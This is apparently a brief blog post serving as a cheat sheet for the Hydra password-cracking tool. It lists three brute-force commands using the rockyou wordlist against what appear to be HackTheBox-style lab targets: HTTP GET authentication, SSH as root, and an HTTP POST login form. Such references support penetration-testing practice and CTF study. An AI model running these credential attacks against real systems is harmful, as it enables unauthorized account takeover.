---
layout: post
title: Hydra
date: 2022-04-09
---
### Basic prompt

```
$ hydra -L words.txt -P /usr/share/wordlists/rockyou.txt http-get://meow.htb:8080 -t 25
```

### SSH attack

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.16 -t 4 -V
```

### POST to form data
```
$ hydra -l "admin@book.htb" -P /usr/share/wordlists/rockyou.txt 10.10.10.176 http-post-form "/admin/index.php:email=^USER^&password=^PASS^&Login=Login:Nope" -V
```